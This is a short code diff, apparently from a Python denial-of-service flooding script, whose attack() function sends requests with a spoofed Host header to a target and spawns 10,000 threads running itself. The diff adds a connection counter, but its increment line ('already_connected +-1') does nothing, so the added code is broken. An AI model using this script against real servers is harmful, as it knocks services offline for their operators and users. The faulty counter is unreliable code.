@@ -15,6 +15,11 @@ def attack():
     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target,port))
     s.close()
     
+    global already_connected
+    already_connected +-1
+    if already_connected % 10000 == 0 :
+      print(already_connected)
+    
     for i in range(10000):
       thread = threading.Thread(target=attack)
       thread.start()
